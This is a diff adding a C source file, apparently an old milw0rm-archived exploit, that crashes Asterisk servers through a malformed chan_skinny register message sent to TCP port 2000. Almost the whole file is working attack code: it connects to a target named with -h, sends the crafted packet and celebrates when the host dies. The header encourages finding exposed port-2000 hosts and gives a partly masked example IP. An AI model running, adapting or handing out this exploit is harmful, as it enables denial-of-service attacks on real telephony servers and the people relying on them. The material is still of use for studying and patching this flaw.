@@ -1,0 +1,181 @@
+/*
+ *  AstKilla2.c 
+ *  gcc -o astkilla2  astkilla2.c 
+ * ./astkilla2 -h 216.246.**.***
+ * In no event will the author of this source be liable for any loss or damage of a material or 
+ * immaterial nature arising from access to, use or non-use of published information, or from misuse of the connection or technical faults. 
+
+			
+		chan_skinny runs on 2000/TCP if you find a host with this open there is a really decent chance it's a asterisk machine some admin 
+		forgot to disable chan_skinny on (which is default).. this should be a to all of those who don't lock down what they dont need (what is this 1999 ?)
+				
+		this is really quite old but as it turns out someone made the bug public, how sad.. but eh there are more fish in sea ;)
+	        well here is a exploit for everyone who didn't take a look at the code.
+
+		
+									-- = fbff = --
+
+*/
+#include <stdio.h>
+#include <stdlib.h>
+#include <arpa/inet.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <errno.h>
+#include <netdb.h>
+#include <netinet/tcp.h>
+
+#define SKINNY_TCP_PORT  2000
+#define CLEN             1024
+#define SKINNY_MAX_SIZE  1000
+#define REGISTER_MESSAGE 0x0001
+struct register_message {
+	char name[16];
+	uint32_t userId;
+	uint32_t instance;
+	uint32_t ip;
+	uint32_t type;
+	uint32_t maxStreams;
+};
+struct skinny_client {
+	int sd;
+	struct sockaddr_in saddr;
+	int active;
+	char rhost[CLEN];
+	char username[CLEN];
+	char password[CLEN];
+	char packet[SKINNY_MAX_SIZE];
+};
+struct skinny_client_message {
+	int len;
+	int res;
+	int e; /* 12 bytes */
+	char *data;
+};
+
+struct skinny_client *g_sc;
+struct messages {
+	int e;
+	char *human;
+	int (* const message_handler)(struct skinny_client *sc, struct skinny_client_message *scm);
+} message_list[] =  {
+	{0x81,"Register Ack Message\n", NULL},
+	{0x9b,"Capabilities Request Message\n",NULL},
+	{0x9f,"Reset Message\n", NULL}
+};
+int skinny_client_read(struct skinny_client *sc)
+{
+	int ret;
+	int elm;
+	int type;
+	int i;
+	char buf[SKINNY_MAX_SIZE];
+	struct skinny_client_message scm;
+	memset(&scm,0x00,sizeof(struct skinny_client_message));
+	memset(&buf,0x00,sizeof(buf));
+	elm = (sizeof(message_list)/sizeof(struct messages));
+	ret = read(sc->sd,&buf,sizeof(buf));
+	if (ret == -1) {
+		printf("+++ GOOD NEWS THE REMOTE HOST IS DEAD! READ RETURNED -1 AND THE TCP CONNECTION HAS WENT BYEBYE\n");
+		return -1;
+	} else if (ret < sizeof(struct skinny_client_message) - 4){
+		printf("we got some data back from the server just to little of it!\n");
+	} else {
+		printf("++++ THINGS BROKE BUT THE HOST MAY STILL BE UP. HOW SAD\n");
+	}
+
+	return 0;
+}
+int skinny_client_sendmessage(struct skinny_client *sc, struct skinny_client_message *scm)
+{
+	int res;
+	int len;
+	char *outbuf;
+	int test;
+	
+	len = 90;
+	scm->len = 3;
+	outbuf = malloc(len);
+	if (!outbuf) {
+		return -1;
+	}
+	memset(outbuf,0x41,len);
+	/* place the 12 bytes header into outbuf */
+	memcpy(outbuf,scm,12);
+	/* place the data into outbuf */
+	memcpy(outbuf+12,scm->data,len-12);
+	res = write(sc->sd,outbuf,len);
+	printf("++ Wrote %i bytes\n", res);
+	return 0;
+}
+
+/* send out a client register message to the remote skinny node */
+int skinny_client_register(struct skinny_client *sc)
+{
+	struct skinny_client_message scm;
+	struct register_message *rm;
+	int len;
+
+	rm = malloc(sizeof(struct register_message )) + 4;
+
+	if (!rm) {
+		printf("we could not allocated space for the register message\n");
+		return -1;
+	}
+
+	len = sizeof(struct register_message);
+	scm.len  = htonl(len);
+	scm.e    = htonl(REGISTER_MESSAGE);
+	scm.data = (char *)rm;
+	strcpy(rm->name,"SEP0007EB463101\x00");
+	rm->type = 30006;
+	skinny_client_sendmessage(sc,&scm);
+	skinny_client_read(sc);
+	return 0;
+}
+
+int skinny_client_connect(struct skinny_client *sc)
+{
+	int ret;
+	sc->sd = socket(AF_INET,SOCK_STREAM,0);
+	if (sc->sd == -1) {
+		return -1;
+	}
+	sc->saddr.sin_family = AF_INET;
+	sc->saddr.sin_port = htons(SKINNY_TCP_PORT);
+	sc->saddr.sin_addr.s_addr = inet_addr(sc->rhost);
+	ret = connect(sc->sd, (struct sockaddr *)&sc->saddr,sizeof(struct sockaddr));
+	if (ret != 0) {
+		printf("+++ UNABLE TO CONNECT TO REMOTE HOST 2000/TCP!\n");
+		return -1;	
+	}
+	printf("+++ CONNECTION OK\n");
+	sc->active = 1;
+	return 0;
+}
+
+int main(int argc, char **argv)
+{
+		int i;
+	        struct skinny_client *sc;
+		pthread_attr_t attr;
+		sc = malloc(sizeof(struct skinny_client));
+		memset(sc,0,sizeof(struct skinny_client));
+		
+		for (i=0;i<argc;i++) {
+			if (!strcmp(argv[i], "-h")) {
+				strcpy(sc->rhost,argv[i+1]);	
+			}
+		}
+		if (*sc->rhost == 0) {
+			printf("+++ You must run with the -h option\n");
+			return 0;
+		}
+		skinny_client_connect(sc);
+		skinny_client_register(sc);
+
+	return 0;
+}
+
+// milw0rm.com [2007-07-18]
